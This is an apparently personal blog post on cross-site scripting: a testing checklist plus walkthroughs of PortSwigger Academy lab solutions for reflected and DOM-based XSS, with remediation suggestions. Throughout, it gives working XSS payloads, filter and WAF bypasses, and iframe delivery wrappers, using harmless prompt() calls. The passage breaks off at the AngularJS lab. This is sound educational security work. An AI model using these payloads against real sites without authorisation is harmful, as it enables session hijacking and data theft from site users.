---
layout: post
title: XSS (Cross site scripting)
subtitle: Victim visit malicious URL/site to trigger the payload made of JavaScript. Causing their session to be controlled or data to be stolen
date: 2025-09-15 19:15
author: Ren Sie
comments: true
category: script-input
thumbnail-img: /assets/img/githubpost/xxs_thumb.png
---

Cross-site scripting (XSS) is a web security flaw where attackers inject malicious scripts into trusted websites, which then execute in the browsers of unsuspecting users. This exploitation allows attackers to steal sensitive data, hijack user sessions, or manipulate website content by taking advantage of web applications that do not properly validate or sanitize user input.


{: .box-note}
**Note:** 💡 During the testing, use `print()` `prompt("text")` instead of `alert()` since `alert()` is commonly detected and filtered. <br> When testing for XXS, test for html injection first because it’s more likely to work
E.g., \<h1\>test\</h1\>

## Checklist
<details markdown="1">
  <summary>Click me to expand checklist</summary>  

1. **Is input reflected in the response?**

2. **Can we inject HTML?**
   - E.g., `https[://]victim[.]com/search?user=<img src=x onerror=prompt("XSS")>`
    
3. **Any weaknesses in the Content Security Policy (CSP)?**
   - Use of unsafe directives which allow execution of inline scripts or eval() functions, bypassing CSP protections. <br> E.g.,`Content-Security-Policy: script-src 'self' 'unsafe-inline' 'unsafe-eval';`
   - Allowing broad sources or wildcards in directives (e.g., script-src), which permits potentially untrusted external scripts to run. <br> E.g., `Content-Security-Policy: script-src *;`
   - Inclusion of compromised or vulnerable third-party domains in trusted sources, such as JSONP endpoints that can be exploited to inject malicious scripts. <br> E.g., `https[://]third-party_domain[.]com/jsonp?callback=prompt("xss is available!")`
   - Omitting strict directives for resources like object-src or failing to restrict nonces and hashes properly which can allow script injection.
   - Weak or predictable nonces (e.g., 'nonce-12345') that attackers can guess or reproduce to bypass CSP restrictions.
 
4. **Can we use events (e.g. onload, onerror)?**
   - `<body onload="prompt('XSS via onload!')"> Welcome to the website! </body>`
   - `<a href="https[://]trusted[.]com/search?user=<img src=x onerror=prompt("XXS Available")>"> Click me! </a>`

5. **Are there any filtered or escaped characters?**
   - E.g., `<`, `>`, `"`, `'`, `javascript:`, `alert()`
   - Refer to [XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)

6. **Is input stored and then later rendered?**

7. **Can we inject into non-changing values (e.g. usernames, comments, etc.)?**
   - E.g., web application allows user input and stores them without proper sanitization.

8. **Any input collected from a third party (e.g. account information)?**
   - Third-party inputs refer to any data or content that comes from an external source (via third-party api) or from other users.

9. Is the version of the framework or dependency vulnerable?
   - [OWASP Dependency-Check](https://github.com/dependency-check/DependencyCheck)
   - [OWASP Dependency-Check Installation and Scanning First project](https://www.youtube.com/watch?v=hWiI700y3J0)

</details>

## 1. Reflected XSS
Inject payload into the HTTP request. And once the web server receive the request, it will response with the payload to sender’s browser. It relies on URL to make user fall for the attack.

### Labs (Reflected XSS)
Just for demostration, I completed some labs on [PortSwigger Academy](https://portswigger.net/web-security/all-labs#cross-site-scripting) to show how this vulnerability can lead to:

<details markdown="1">
<summary>Click me to expand the labs</summary>  

  _**1. Reflected XSS into attribute with angle brackets HTML-encoded**_  
  The application contains a reflected XSS vulnerability in the search blog feature, where angle brackets are HTML-encoded. I inject an attribute via XSS that triggers an alert function.
  
  <details markdown="1">
  <summary>Click me to expand the process</summary>
  
  1. Enter random input (e.g., test123) in the user input (URL query)
     ~~~
     URL: https[://]web-security-academy[.]net/?search=test123
     ~~~
  
  2. Utilize search function in inspection tab, and search for input (e.g., test123)
     ~~~
     Result: <input type="text" placeholder="Search the blog..." name="search" value="test123">
     ~~~
  
  3. After learning that our input is within a double-quoted attribute, we can try to bypass the double-quoted attributes by breaking out of the attribute value with the injection of double quotes or equivalent encodings, and then adding the HTML events that triggers the payload.
     ~~~
     URL: https[://]web-security-academy[.]net/?search=test123" onmouseover="alert(test)
     Result: <input type="text" placeholder="Search the blog..." name="search" value="test123" onmouseover="alert(test)">
     ~~~

     {: .box-note}
     **Note:** The `value` attribute is closed early by the injected quote, and `onmouseover="alert(1)` is interpreted as a new `onmouseover` attribute on the \<input\> tag.

  4. Once I hover the cursor over the search bar, it triggers the alert. I identify the XSS vulnerability.

  </details>
  -

  _**2. Reflected XSS into a JavaScript string with angle brackets HTML encoded**_  
  In this instance, the application is vulnerable to reflected XSS in the search query tracking functionality, where angle brackets are encoded. The reflection occurs inside a JavaScript string. I break out of the string and triggers the `prompt()` function, to demonstrate the vulnerability.
  
  <details markdown="1">
  <summary>Click me to expand the process</summary>
  
  1. I enter random input (e.g., test) in the user input (search bar)
  
  2. Utilize search function in inspection tab, and search for input (e.g., test). I find that the input is directly past into the function.
     ```javascript
     var searchTerms = 'test';
       document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
     ```
  
  3. Now I learn that my input is inside the single quote, I try breaking out the single quote with:
     ~~~
     Input: '-prompt("TestXSS")-' # breaks the single quote
           or \\'-prompt("TestXSS")// # If single quotes are escaped
     ~~~
  
  4. The message pops up after I send the query, which confirms that this instance is vulnerable to XSS. <br> Just to double-check, I pull out the script from the inspection tab.
     ```javascript
     var searchTerms = ''-prompt("TestXSS")-'';
     document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
     ```
  </details>
  -

  _**3. Reflected DOM XSS**_  
  In this instance, a script on the page processes reflected data (user input) with `eval()` without any sanitization and ultimately writes it to a dangerous sink.
  
  <details markdown="1">
  <summary>Click me to expand the process</summary>

  1. First, I find the script used in the web application under the Network tab on the Inspection page.
     - The `xhr.open` method sends a GET request (with user input retrieved from `path + window.location.search`) and fetches data from the server using `XMLHttpRequest`.
     - Then it parses the JSON response (`this.responseText`) with `eval()`.
     - Lastly, it dynamically create and display search results (`displaySearchResults`) in the HTML DOM.

     ```javascript
     var xhr = new XMLHttpRequest();
     xhr.onreadystatechange = function() {
          if (this.readyState == 4 && this.status == 200) {
          eval('var searchResultsObj = ' + this.responseText);
          displaySearchResults(searchResultsObj);
          }
     };
     xhr.open("GET", path + window.location.search);
     xhr.send();
     ```
   
  2. I send a test request and intercept the response using Burp Proxy.
     ```json
     {"results":[],"searchTerm":"test"}
     ```

  3. Because the script uses `eval()` to process the response, I can insert the `prompt()` function (see JSON Values in the [JSON Syntax](https://www.w3schools.com/js/js_json_syntax.asp))."  
     Now that I know the JSON structure, I create an input to break out of the expected structure in Burp Repeater.

  4. In the response to my first payload attempt `test\"-prompt()}//`, the double quote is escaped by the application, so I add an extra backslash (`\`) to bypass it.
     ~~~
     1-st_Request: ?search=test"-prompt()}//
     Response: {"results":[],"searchTerm":"test\"-prompt()}//"}
     ~~~
     ~~~
     2-nd_Request: ?search=test\"-prompt()}//
     Response: {"results":[],"searchTerm":"test\\"-prompt()}//"}
     ~~~

     {: .box-note}
     **Note:** The [Arithmetic Operators](https://www.w3schools.com/programming/prog_operators_arithmetic.php#gsc.tab=0) (`-`) forces `prompt()` to be parsed and executed as part of an expression. And ensuring it is executed immediately, not just ignored.
     And the `//` comments out whatever is after it.

  </details>
  -

  _**4. Reflected XSS into HTML context with most tags and attributes blocked**_  
  In this instance, the `/?search` parameter is being reflected into the page as HTML without proper contextual encoding or sanitization, and the WAF’s tag/attribute filtering is insufficient, so I bypass the filter and executes `prompt()`.

  <details markdown="1">
  <summary>Click me to expand the process</summary>

  1. After using general XSS testing payloads, I learn that the WAF is blocking some HTML tags to prevent common XSS.
     ~~~
     Payload: <img src="0" onerror="prompt()">
     Respond: "Tag is not allowed"
     ~~~

  2. To find out which tag isn't blocked, I used Burp Intruder with all tag options as payload (retrieved from the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)). The result tells me that `<body>` is not blocked by the WAF.
     ~~~
     Burp Intruder:
     GET /?search=<Payload Position> HTTP/2
     ~~~

  3. After enclosing payloads within the `<body>` tag, I learn that the WAF is also blocking some attributes.
     ~~~
     Payload: <body onload="prompt()">
     Respond: "Attributes is not allowed"
     ~~~

  4. Repeating step 2, but this time I copy the events from the XSS cheat sheet. I got some events that comes back with 200 OK. 
     ~~~
     Burp Intruder:
     GET /?search=<body%20<Payload Position>=prompt()>
     ~~~

  5. To make the exploitation more realistic, after going through the unfiltered event attributes:
     - I used an `<iframe>` to embeds this vulnerable webpage (`src="https[://]vulnerable[.]com/`).
     - The query parameter `/?search` then load the URL-encoded payload `%22%3E%3Cbody+onresize=prompt()%3E`
     - [this.style.width](https://www.w3schools.com/jsref/prop_style_width.asp) to adjust the iframe’s size, which will trigger the `onresize` event and `prompt()`.

     ~~~
     <iframe src="https[://]vulnerable[.]com/?search=%22%3E%3Cbody+onresize=prompt()%3E" onload=this.style.height='88px'></iframe>
     ~~~

  6. Because I bypass the WAF filter with non-filterd tag and attribution, the function `prompt()` will be executed once someone clicks on the link.

  _**Suggestion**_
  1. [Treating user input strictly as data](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#xss-defense-philosophy). Encode/escape for the HTML context or render search terms as text nodes, never raw HTML.
  2. Apply a server‑side allowlist sanitizer (or a vetted library such as [DOMPurify](https://www.npmjs.com/package/dompurify) when sanitization is required)
  3. Enforce [Content Security Policy](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html) that disallows inline event handlers/scripts.
  4. [Harden WAF normalization/rules](https://docs.oracle.com/en-us/iaas/Content/WAF/Protections/protections_management.htm) to catch decoded event-attribute payloads.

  </details>
  -

  _**5. Reflected XSS into HTML context with all tags blocked except custom ones**_  
  In this instance, I find that the WAF blocks standard tags but allows custom element names. Because browser will parse custom tags as valid elements (`<cust-foo>`) and allow attributes (`onfocus`), I bypass the WAF and execute a prompt with custom tag, and other components to simulate the exploit in a real‑world scenario.

  <details markdown="1">
  <summary>Click me to expand the process</summary>

  1. I started by testing the input form, and the response indicated that the tag was blocked.
     ~~~
     Request: GET /?search=<script>test</script>
     Response: "Tag is not allowed"
     ~~~

  2. Then I tried using a custom tag (`<cust-foo>`); this time, I did not receive any error. This confirms that the WAF does not block [custom tag](https://matthewjamestaylor.com/custom-tags).
     ~~~
     Request: GET /?search=<cust-foo>test</cust-foo>
     Response: HTTP/2 200 OK
     ~~~

  3. The browser treats custom tags (`<cust-foo>`) as valid HTML elements and parses their attributes and event handlers (`onmouseover`), which execute JavaScript when triggered by moving the cursor over a specific spot.
     ~~~
     Request: GET /?search=<cust-foo onmouseover='prompt("xss")'>Move your mouse here</cust-foo>
     Response: A pop-up "xss"
     ~~~

  4. To make the exploitation more realistic, I used custom tags with some components to create an .html file. As soon as a user opens it, they woulbe be redirected to the designated page and the prompt was executed:
     - `window.location.assign()`: Redirect the user's browser to a new URL while keeping the current page in the session history (Back button available).
     - `id`: Gives the element a unique identifier in the DOM (e.g., a1).
     - `tabindex`: Makes the element focusable, which can be used with `onfocus` events.
     - `onfocus`: The JavaScript will be triggered when the element (`id`) receives focus.
     - `#a1`: Call out and focus on the element `a1`.

     ```javascript
     <script>
     window.location.assign("https[://]vulnerable[.]com/?search=<cust-tag id=a1 tabindex=1 onfocus='prompt("I am focusable")'>#a1")
     </script>
     ```

  _**Suggestion**_
  1. Use a proven HTML sanitizer (e.g. [DOMPurify](https://www.npmjs.com/package/dompurify)) on output that must contain HTML (server-side)
  2. Configure [allowlists](https://help.ivanti.com/ht/help/en_US/ISM/2025/admin-user/Content/Configure/SetUpWizard/Configure%20Allowed%20Tags%20and%20Attribute.htm), only permit required tags and attributes, and explicitly exclude all event handler attributes (e.g., on*).
  3. Apply the appropriate [encoding](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#output-encoding) based on where the data will be used (body, attribute, JavaScript string, URL, CSS), and do not rely on a single generic encoding for all contexts.
  4. Prefer [framework helpers](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#framework-security) and templating engines that provide automatic, correct output escaping rather than hand‑rolling your own escaping logic.
  5. Remove unnecessary HTML rendering of user‑supplied content whenever possible. If a field is a search query or otherwise simple text, return it as plain text (properly escaped) instead of rendering it as HTML with tags.
  
  </details>
  -

  _**6. Reflected XSS with some SVG markup allowed**_  
  In this instance, I discovered a reflected XSS vector that bypasses the WAF by using certain unfiltered tags and event. By inserting those, I was able to execute JavaScript, demonstrating a reflected XSS bypass through SVG + SMIL animation events.

  <details markdown="1">
  <summary>Click me to expand the process</summary>

  1. I started by testing the input form, and the response indicated that the tag was blocked.
     ~~~
     Request: GET /?search=<script>prompt()</script>
     Response: "Tag is not allowed"
     ~~~

  2. To find out which tag isn't blocked, I used Burp Intruder with all tag options as payload (retrieved from the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)). The result tells me that `<animatetransform>`, `<image>`, `<svg>`, `<title>` are not blocked by the WAF.
     ~~~
     Burp Intruder:
     GET /?search=<Payload Position> HTTP/1.1
     ~~~

  3. Next, to find out which event is not filtered. I repeated step 2 but copied the events from the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet). I use `<image>` as example since I know it is not filtered, then I received only `onbegin` events that returned 200 OK.
     ~~~
     Burp Intruder:
     GET /?search=<image+src="x"+<Payload Position>=1> HTTP/1.1
     ~~~

  5. After some [researches](https://developer.mozilla.org/en-US/docs/Web/API/SVGAnimationElement/beginEvent_event, "SVGAnimationElement: beginEvent event"), I learned that `<svg>` and `<animatetransform>` can be used with `onbegin`. To test it out, I inserted `prompt()`, and the application responded with a pop‑up window containing my text, which proves that I bypassed the WAF's filters and executed a test script.
     ~~~
     <svg><animatetransform onbegin='prompt("Is this vulnerable to XSS?")'>
     ~~~
   
  _**Suggestion**_
  1. Treat any HTML or SVG in user input as untrusted. Ensure [server‑side output encoding](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#output-encoding) is applied.
  2. If you must allow HTML/SVG, sanitize server‑side with a library that understands and safely handles SVG (e.g., [DOMPurify](https://www.npmjs.com/package/dompurify)).
  3. Deploy [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP) that avoids unsafe-inline and blocks inline script execution and data:/javascript: URLs (use script-src 'self' plus nonces/hashes if inline scripts are required).

  </details>
  -

  _**7. Reflected XSS in canonical link tag**_  
In this instance, I discovered that untrusted input from the URL query string is reflected into canonical link tag in the page source. By injecting [accesskey](https://www.w3schools.com/jsref/prop_html_accesskey.asp, "HTML DOM Element accessKey") attribute,  I was able to prove code execution in the page context after pressing the keystroke triggered JavaScript.

  <details markdown="1">
  <summary>Click me to expand the process</summary>

  1. I opened the Inspector and found the canonical link in the source code.
     ~~~
     <link rel="canonical" href="https://web-security-academy.net/">
     ~~~

  2. I inserted a test string (`?test`) into the URL and saw my input rendered directly in the canonical link.
     ~~~
     <link rel="canonical" href="https[://]web-security-academy[.]net/?test">
     ~~~

  3. I then added an `accesskey` attribute to the `<link>` tag, and when the designated key was pressed it triggered the `onclick` event. The results showed:
     - Spaces in my input were encoded (`%20`) in the URL, but they were rendered as extra encoded spaces (` %20`) in the source code.
     - A single quotes were encoded (`%27`) in the URL, but they rendered as double quotes in the source code.
     ~~~
     Request: /?test' accesskey='x' onclick='prompt(test)
     Response: <link rel="canonical" href="https[://]web-security-academy[.]net/?test" %20accesskey="x" %20onclick="prompt(test)">
     ~~~

  4. To bypass this, I removed the spaces from my input. After pressing Ctrl+Alt+X, a popup displayed my message.
     ~~~
     Request: /?test'accesskey='x'onclick='prompt(&quot;XSS&nbsp;vulnerable?&nbsp;YES!&quot;)
     Response: <link rel="canonical" href="https[://]web-security-academy[.]net/?test" accesskey="x" onclick="prompt(&quot;XSS&nbsp;vulnerable?&nbsp;YES!&quot;)">
     ~~~

  _**Suggestion**_
  1. Don't reflect user input directly into HTML, ensure [server‑side output encoding](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#output-encoding) is applied.
  2. [Sanitize & validate input](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html#implementing-input-validation), if input used as a URL, validate against an allow-list of permitted patterns.
  3. Use [DOM methods](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#rule-6-populate-the-dom-using-safe-javascript-functions-or-properties) to create and manage elements, attributes, and text nodes safely.
  4. Add/strengthen [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP).
  5. Use [HTTP security headers](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html#security-headers).

  </details>
  -

  _**8. Reflected XSS into a JavaScript string with single quote and backslash escaped**_  
  In this instance, I discover a XSS vulnerability in the search tracking code. The application inserts user input directly into a JavaScript single-quoted string and escapes single quotes with a backslash, but it does not prevent breaking out of the surrounding script context (angle bracket > not escaped). I terminate the `<script>` tag and injecting a new `<script>` block.

  <details markdown="1">
  <summary>Click me to expand the process</summary>

  1. I start by testing the input (`test_input`) to see where it is rendered in the source code, then I find my input is in a search function.
     ```javascript
     <script>
       var searchTerms = 'test_input';
       document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
     </script>
     ```
   
  2. To test whether I can break out of the single quote (`'`), I try entering a single quote, but it is escaped with a backslash (`'\`).
     ```javascript
     <script>
       var searchTerms = '\'test_input';
       document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
     </script>
     ```
   
  3. I try to escape the backslash (`\\'`), but it doesn’t work.
     ```javascript
     <script>
       var searchTerms = '\\\'test_input';
       document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
     </script>
     ```
   
  4. Then I discover that the angle bracket isn’t escaped, so I close the existing tag with `</script>` and insert a new one `<script>prompt();</script>`. A popup then displays my message.
     ```javascript
     <script>
       var searchTerms = '</script><script>prompt("Am I vulnerable to XSS");</script>
       ';document.write('
     ```
   
  _**Suggestion**_
  1. Validate and sanitize user input on client side to reject or clean inputs containing malicious characters or script tags.
  2. When inserting user input into JS strings, use [output encoding](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#output-encoding) that safely escapes all special characters that could break the context, not just single quotes and backslashes.
  3. Don't place variables into [dangerous contexts](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#dangerous-contexts) as even with output encoding.
  4. Implement [Content Security Policy](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html#defense-against-xss) that limits the sources and inline script execution. 

  </details>
  -

  _**9. Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped**_  
  In this instance, user input is inserted into a <script> tag with insufficient sanitization. Although special characters (e.g., `<>`, `"`) are HTML-encoded, single quotes (`'`) are only escaped with a backslash (`\'`), I bypass the protection by escaping the backslash itself.

  <details markdown="1">
  <summary>Click me to expand the process</summary>

  1. I start by testing the input (`test_input`) to see where it is rendered in the source code, then I find my input is in a search function.
     ```javascript
     <script>
       var searchTerms = 'test_input';
       document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
     </script>
     ```
  2. To test whether I can break out of the single quote (`'`), I try entering a single quote and inserting a new tag, but the single quote is escaped with a backslash (`\'`), and the angle bracket and double quote are HTML-encoded for escaping.
     ```javascript
     <script>
       var searchTerms = '\' &lt;/script&gt;&lt;img src=&quot;x&quot; onerror=&quot;prompt()&quot;&gt;';
     </script>
     ```
  3. I try to escape the backslash (`\\'`), and it works.
     ```javascript
     <script>
       var searchTerms = '\\'';
     </script>
     ```   
  4. Now I know that the single quote will be escaped with a backslash (`\'`), but the backslash itself can be escaped by inserting another backslash (`\\'`). Double quotes and angle brackets are HTML-encoded for escaping. We can craft the payload:
     - Backslash neutralizes the escaping (`\\'`).
     - Hyphen serves as a valid operator between two expressions ensures the payload executes as JavaScript ('string' - prompt()).
     - Double forwardslash comments out trailing quotes (`//`).
     ```javascript
     <script>
       var searchTerms = '\\' - prompt()//';
     </script>
     ```
     
  5. As the web application response with a pop up window, I am assure that it is vulnerable to reflected XSS.

  _**Suggestion**_
  1. Apply JS [context-aware encoding](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#output-encoding) when injecting untrusted data into JavaScript,
  2. Validate and sanitize user input on client side to reject or clean inputs containing malicious characters or script tags.
  3. Implement a [CSP header](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html#defense-against-xss) to reduce the impact of XSS.
  4. Employ frameworks or libraries (e.g., [angular](https://angular.dev/best-practices/security#preventing-cross-site-scripting-xss)) that automatically escape user input based on context, or server-side templating engines with built-in sanitization.

  </details>
  -

  _**10. Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped**_  
  This web application is vulnerable to a Reflected XSS flaw due to unsafe interpolation of user input within a [JavaScript template literal](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals). Although special characters (`<>`, `"`, `'`, `\`, `` ` ``) are Unicode-escaped, the vulnerability remains because input is evaluated inside a `${}` expression within the template literal without proper escaping.

  <details markdown="1">
  <summary>Click me to expand the process</summary>

  1. I start by testing the input (`'"``<>\`) to see where it is rendered in the source code, then I find my input is in a JavaScript template literals. And I also notice that all the special characters are unicode-escaped.
     ```javascript
     <script>
       var message = `0 search results for '\u0027\u0022\u0060\u003c\u003e\u005c'`;
       document.getElementById('searchMessage').innerText = message;
     <\script>
     ```
     
  2. Because JavaScript evaluates whatever is inside the embedded expression (`${}`) of a template literal as code, I tried to insert my payload directly to test whether there was a filter or any other protection implemented.
     A window popped up after inserting my payload, which proves this instance is still vulnerable to reflected XSS because there is no protection on its JS template literal.
     ```javascript
     <script>
       var message = `0 search results for '${prompt()}'`;
       document.getElementById('searchMessage').innerText = message;
     <\script>
     ```

  _**Suggestion**_
  1. Apply JS [context-aware encoding](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#output-encoding) when injecting untrusted data into JavaScript,
  2. Apply a server‑side allowlist sanitizer (or a vetted library such as [DOMPurify](https://www.npmjs.com/package/dompurify) when sanitization is required)
  3. Implement [CSP header](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html#defense-against-xss) to reduce the impact of XSS.

  </details>
  -

</details>

## 2. Dom-Based XSS
Client-side has vulnerable JavaScript. It doesn’t involve with the server-side, completely rely on client’s browser to execute the payload.
One quick check is turn on the developer tool, input and execute a simple prompt or alert script, see if there’s any network interaction with the server.

{: .box-note}
**Note:** 🚨 Inspecting Network page in the developer tab while sending input. If there’s no external communication happens, it indicates it is Dom-Based XXS.

### Labs (Dom-Based XSS)
Just for demostration, I completed some labs on [PortSwigger Academy](https://portswigger.net/web-security/all-labs#cross-site-scripting) to show how this vulnerability can lead to:

<details markdown="1">
  <summary>Click me to expand the labs</summary>  

  _**1. DOM-based XSS in document.write sink using source location.search**_  
  The target application use `document.write()` function to display content from `location.search`, which comes from the URL query string. Allows users to modify the URL, and to inject and execute arbitrary scripts in the page.
  
  <details markdown="1">
  <summary>Click me to expand the process</summary>  
  
  1. Enter random input (e.g., 123456) in the user input (URL query)
     ~~~
     https[://]web-security-academy.net/?search=123456
     ~~~
  
  2. Right-click on the webpage and open the inspection tab
  
  3. Press `Crtl+F` to open search function in inspection tab, and search for input (e.g., 123456)
     ~~~
     Result: <img src="/resources/images/tracker[.]gif?searchTerms=123456">
     ~~~
  
  4. After knowing the syntax. We can add a closing angle bracket to close up the img tag, and add a new tag with the payload. I use HTML encoding to bypass the filter.
     ~~~
     URL: "><script src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041"></script>
     Result: <img src="/resources/images/tracker[.]gif?searchTerms=">
          <script src="x" onerror="javascript:alert('XSS')"></script>
     ~~~

  </details>
  -

  _**2. DOM XSS in innerHTML sink using source location.search**_  
  The application It assigns data from `location.search` to `innerHTML`, which updates the contents of a `<div>`. Since the URL can be controlled by the user, they can inject malicious HTML or scripts.
  
  <details markdown="1">
  <summary>Click me to expand the process</summary>  
  
  1. Enter random input (e.g., 123456) in the user input (URL query)
     ~~~
     https[://]web-security-academy.net/?search=123456
     ~~~
  
  2. Right-click on the webpage and open the inspection tab
  
  3. Press `Crtl+F` to open search function in inspection tab, and search for input (e.g., 123456)
     ~~~
     Result: <span id="searchMessage">123456</span>
     ~~~
  
  4. After knowing the syntax. I can add a closing tag to close up `<span>`, and add a new `<img>` tag with the payload. I use HTML encoding to bypass the filter.
       ~~~
       URL: https[://]web-security-academy[.]net/?search=</span><img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
       Result: <span id="searchMessage"><img src="x" onerror="javascript:alert('XSS')"></span> <span>'</span> == $0
     ~~~
  
  </details>
  -
  
  _**3. DOM XSS in jQuery anchor href attribute sink using location.search source**_  
  In this instance, jQuery’s `$` selector is used to find a link and set its `href` using data from `location.search`, which comes from the URL query string.
  
  <details markdown="1">
  <summary>Click me to expand the process</summary>
  
  1. Right-click on the webpage and open the inspection tab. I search for `location.search`, which led me to this script:
     ```javascript
     $(function() {
       $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
     });
     ```
  
  2. I also notice that the URL contains the `returnPath` query parameter, which aligns with the script. Which uses this query parameter to set the href attribute of the backlink.
     ~~~
     URL: https[://]web-security-academy[.]net/feedback?returnPath=/
     ~~~
  
  3. Insert the payload into the `returnPath` query parameter.
     ~~~
     URL: https[://]web-security-academy[.]net/feedback?returnPath=javascript:prompt(document.cookie)
     Result: <a id="backLink" href="javascript:prompt(document.cookie)">Back</a>
     ~~~
  
  </details>
  -

  _**4. DOM XSS in jQuery selector sink using a hashchange event**_  
  There is a DOM-based XSS vulnerability on the home page, where jQuery’s `$()` selector is used to auto-scroll to a post, with the title passed through `location.hash`.
  
  <details markdown="1">
  <summary>Click me to expand the process</summary>
  
  1. Firstly, I search for `$()` in the inspection tab, and I find the syntax for this function. Which listens for hash changes in the URL (`/#`) and scrolls the corresponding blog post into view based on the hash value.
     ```javascript
     $(window).on('hashchange', function(){
       var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
       if (post) post.get(0).scrollIntoView();
     });
     ```
  
  2. I append a simple XSS test payload with a hashtag to the URL, and the print function is triggered. The XSS vulnerability in this application is confirmed.
     ~~~
     URL: https[://]web-security-academy[.]net/#<img src=x onerror=print()>
     ~~~

  3. In the case that I want to deliver this payload to others, I utilize `iframe`, `onload`, `img src`, and `onerror` to trigger the payload once they open the page.
     ~~~
     URL: <iframe src="https[://]web-security-academy[.]net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
     ~~~

     {: .box-note}
     **Note:** The `onload` attribute of the `iframe` runs JavaScript to append the print payload directly into the URL fragment after the page loads. The vulnerable page inside the iframe then reads this fragment (<img src=x onerror=print()>) and executes the injected payload.
  
  </details>
  -

_**5. DOM XSS in document.write sink using source location.search inside a select element**_  
  This instance contains a DOM-based XSS vulnerability in the stock checker functionality. It leverages the `document.write` function to output data to the page, using data from `location.search` that user can control through the website URL. The input data is between the `<option>` tag, I break out of it and calls the `prompt` function.
  
  <details markdown="1">
  <summary>Click me to expand the process</summary>
  
  1. Firstly, I discover the function in the inspection tab (`right-click on the webpage > inspect`).
     And I learn that the script builds a `<select name="storeId">` dropdown by reading a `storeId` query parameter from the URL and, if present, adding it as the selected `<option>` before adding the three hard-coded stores (skipping any duplicate).
     It uses `document.write` with the raw URL value, so unescaped input could be reflected into the page; creating elements and setting textContent/value.
     ```javascript
     var stores = ["London", "Paris", "Milan"];
     var store = (new URLSearchParams(window.location.search)).get('storeId');
     document.write('<select name="storeId">');
     if(store) {
       document.write('<option selected>' + store + '</option>');
     }

     for(var i = 0; i < stores.length; i++) {
       if(stores[i] === store) {
           continue;
       }
       document.write('<option>' + stores[i] + '</option>');
     }

     document.write('</select>');
     ```

  2. After discovering that the function takes user input in the `storeId` parameter, I add the `storeId` parameter after the original `productId` parameter with a `&`. I then send a test input (e.g., test) to see the application's response. As expected, I am able to add a new selected `<option>`.
     ~~~
     URL: https[://]web-security-academy[.]net/product?productId=2&storeId=test
     Result:
     <select name="storeId">
       <option selected>test</option> # I create this option by inserting the parameter and value in the URL.
       <option>London</option>
       <option>Paris</option>
       <option>Milan</option>
     ~~~
  
  3. Remember this syntax `document.write('<option>' + stores[i] + '</option>');` from the function. What I can do is close the first `<option>` tag, inject new HTML tags and event attributes, and then open another `<option>` tag. I try injecting a couple of new HTML tags, and both work.
     Now, I can confirm that the stock search query function on this web application is vulnerable to XSS.
     ~~~
     Payload-1: storeId=test</option><iframe src="javascript:prompt('work?');"></iframe><option>
     Payload-2: storeId=test</option><script>prompt('work?')</script><option>
     ~~~

  </details>
  -

  _**6. DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded**_  
  This instance contains a DOM-based XSS vulnerability in an `AngularJS` expression within the search functionality. I inject a method (e.g. `$on`/`$eval`) that is available in the current scope to bypass AngularJS's security filter, append the `.constructor` property to create a `Function` object (`function(user_input)`), and then call it with `()` to execute the created function.

  {: .box-note}
